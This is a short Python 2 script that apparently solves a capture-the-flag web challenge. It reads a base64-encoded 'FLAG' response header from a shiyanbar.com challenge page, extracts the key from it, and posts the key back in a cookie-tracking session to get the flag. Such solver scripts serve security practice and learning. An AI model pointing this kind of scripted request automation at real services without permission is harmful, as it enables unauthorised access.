#!/usr/bin/env python
#encoding = utf-8
#simplexue-tian-xia-wu-gong-wei-kuai-bu-po

import urllib
import urllib2
from base64 import *

url = 'http://ctf4.shiyanbar.com/web/10.php'
flag_cip=urllib2.urlopen(url)
key = b64decode(flag_cip.headers['FLAG']).split(':')[1]
payload = {'key': key}
data = urllib.urlencode(payload)
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
res = opener.open(url,data)

print res.read()
